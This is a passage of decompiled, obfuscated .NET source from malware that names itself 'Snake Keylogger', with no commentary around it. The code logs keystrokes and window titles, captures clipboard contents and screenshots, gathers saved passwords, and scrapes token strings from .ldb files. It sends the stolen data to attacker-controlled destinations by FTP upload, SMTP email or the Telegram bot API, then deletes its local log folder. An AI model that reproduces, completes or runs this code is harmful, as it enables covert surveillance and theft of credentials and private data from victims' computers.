        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Clipboard Logs ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD + "\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n";
          MemoryStream contentStream = new MemoryStream(Ɖӓ\u058Fɢ\uFFFD.εŲ\uFFFDãã());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Clipboard" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string WٕRٷЅ = "Clipboard | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD + "\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string 皍̆늻kꓞ = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.i\uFFFD\uFFFDٷ̀("Clipboard" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", 皍̆늻kꓞ, WٕRٷЅ);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void 蠺ٕē䇹Қ(object _param0, EventArgs _param1)
    {
      string str1 = "Screenshot";
      string str2 = ".png";
      string path = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
      try
      {
        if (Directory.Exists(path))
        {
          Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger\\" + str1 + str2;
          int width = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Width;
          Rectangle bounds = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds;
          int height = bounds.Height;
          Size blockRegionSize = new Size(width, height);
          bounds = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          Ɖӓ\u058Fɢ\uFFFD.\u05B5Ѕܪ\uFFFD\u002D();
          Ɖӓ\u058Fɢ\uFFFD.ܪ\u00ABÒW̧();
        }
        else
        {
          Directory.CreateDirectory(path);
          Size blockRegionSize = new Size(\u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Width, \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Height);
          Bitmap bitmap = new Bitmap(\u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Width, \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          Ɖӓ\u058Fɢ\uFFFD.\u05B5Ѕܪ\uFFFD\u002D();
          Ɖӓ\u058Fɢ\uFFFD.ܪ\u00ABÒW̧();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05B5Ѕܪ\uFFFD\u002D()
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Screenshot Logs ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) ".png")
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] buffer = System.IO.File.ReadAllBytes(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          ftpWebRequest.ContentLength = (long) buffer.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            System.IO.File.Delete(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n";
          Attachment attachment = new Attachment(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          message.Attachments.Add(attachment);
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
          Ɖӓ\u058Fɢ\uFFFD.ܪ\u00ABÒW̧();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          byte[] numArray = System.IO.File.ReadAllBytes(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.\uFFFD泮ڿۣ\uFFFD(numArray, Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDﾭ\uFFFDی, "application/x-ms-dos-executable", str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void ܪ\u00ABÒW̧()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        string path = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
label_3:
        ProjectData.ClearProjectError();
        num1 = -2;
label_4:
        num3 = 3;
        if (!Directory.Exists(path))
          goto label_7;
label_5:
        num3 = 4;
        Directory.Delete(path, true);
label_6:
label_7:
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static byte[] \uFFFD\uFFFD\u00BE\uFFFDҡ() => Encoding.Unicode.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zٚ\u00AB\uFFFDę.ToString() + "\r\n\r\n\r\n--------------------------------------------------");

    private static void ӥɮ\uFFFDWܹ(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - keystroke Logs ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zٚ\u00AB\uFFFDę.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            Ɖӓ\u058Fɢ\uFFFD.\uFFFDکܪ\uFFFD\uFFFD = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          MemoryStream contentStream = new MemoryStream(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFD\u00BE\uFFFDҡ());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Keystrokes" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          message.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
          Ɖӓ\u058Fɢ\uFFFD.\uFFFDکܪ\uFFFD\uFFFD = "";
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string WٕRٷЅ = "Keylogger | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zٚ\u00AB\uFFFDę.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string 皍̆늻kꓞ = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.i\uFFFD\uFFFDٷ̀("SnakeKeylogger" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", 皍̆늻kꓞ, WٕRٷЅ);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void C꾯גױc(object _param0, Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgs _param1)
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.ëӚ\u07B9\u003Bҏ, Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ.CurrentWindow, false) != 0)
      {
        Ɖӓ\u058Fɢ\uFFFD.ëӚ\u07B9\u003Bҏ = Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ.CurrentWindow;
        Ɖӓ\u058Fɢ\uFFFD.kÒՄΩş(string.Format("\r\n[ -- {0} -- ]\r\n", (object) Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ.CurrentWindow));
      }
      Ɖӓ\u058Fɢ\uFFFD.kÒՄΩş(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void ϫ鈟\uFFFDϘή(object _param0, Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgs 퓜ëܹҚȨ) => Ɖӓ\u058Fɢ\uFFFD.kÒՄΩş(string.Format("{0}", (object) 퓜ëܹҚȨ.StringValue));

    private static void kÒՄΩş(string ٷJݶΑɢ) => Ɖӓ\u058Fɢ\uFFFD.Zٚ\u00AB\uFFFDę.Append(ٷJݶΑɢ);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr ӚήӓՄс();

    [DllImport("user32.dll", EntryPoint = "GetWindowText")]
    public static extern int Ŕ\uFFFD\uFFFDׁթ(IntPtr _param0, StringBuilder _param1, int _param2);

    [DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
    public static extern int \u0609\u07B8Ŕ\uFFFD皍(
      IntPtr _param0,
      int _param1,
      ref int کœۣױꓞ,
      int _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ܪľЮ\uFFFDŚ(IntPtr _param0, ref int _param1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ӓۣŚRٷ(int _param0);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    public static extern int å\uDA3B\uDD72jЅ(
      uint _param0,
      uint ǎӺіņג,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder اC똛ҏϘ,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    public static extern bool ľ\uFFFDҭӚk(byte[] 䇹ų똛ëҚ);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    public static extern uint ŧ̔̔Ųɮ(uint _param0, uint _param1);

    private static void \uFFFD\uFFFD\u060C\u00BE\uFFFD()
    {
      ThreadStart start;
      // ISSUE: reference to a compiler-generated field
      if (Ɖӓ\u058Fɢ\uFFFD._Closure\u0024__.\u0024I106\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        start = Ɖӓ\u058Fɢ\uFFFD._Closure\u0024__.\u0024I106\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        Ɖӓ\u058Fɢ\uFFFD._Closure\u0024__.\u0024I106\u002D0 = start = (ThreadStart) (() =>
        {
          Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ = new Ɖӓ\u058Fɢ\uFFFD.KeyLogger();
          Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ.KeyDown += new Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler(Ɖӓ\u058Fɢ\uFFFD.C꾯גױc);
          Ɖӓ\u058Fɢ\uFFFD.\uFFFDϒ\uFFFD̔ﾭ.KeyUp += new Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler(Ɖӓ\u058Fɢ\uFFFD.ϫ鈟\uFFFDϘή);
          Application.Run();
        });
      }
      new Thread(start).Start();
    }

    public static byte[] ҏ̲ӓ\u07B8ک() => Encoding.Unicode.GetBytes(Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ));

    public static byte[] \u1CFCŚ\uFFFDã䕃() => Encoding.Default.GetBytes(Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ));

    private static void 뫆ֵ\uFFFDş\uFFFD(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Passwords ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes(Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Ɖӓ\u058Fɢ\uFFFD.ҏ̲ӓ\u07B8ک();
          byte[] buffer2 = Ɖӓ\u058Fɢ\uFFFD.\u1CFCŚ\uFFFDã䕃();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.ܣ\uFFFDӚջɮ("SnakePW" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static bool \u07C2ƉɛܣƟ(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string ē丐\u02F3ʓ\uFFFD(string ӺĂɩ2ۨ)
    {
      string[] collection = ӺĂɩ2ۨ.Substring(checked (ӺĂɩ2ۨ.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string ҟϱ\uF0B9\uFFFDթ(string _param0, bool _param1 = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(_param0));
      string str2 = "";
      string ӺĂɩ2ۨ = str1;
      while (ӺĂɩ2ۨ.Contains("oken"))
      {
        string[] strArray = Ɖӓ\u058Fɢ\uFFFD.ē丐\u02F3ʓ\uFFFD(ӺĂɩ2ۨ).Split('"');
        str2 = strArray[0];
        ӺĂɩ2ۨ = string.Join("\"", strArray);
        if (_param1 && str2.Length == 59)
          break;
      }
      return str2;
    }

    public static void \u00BEϫœ븤O()
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Passwords ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
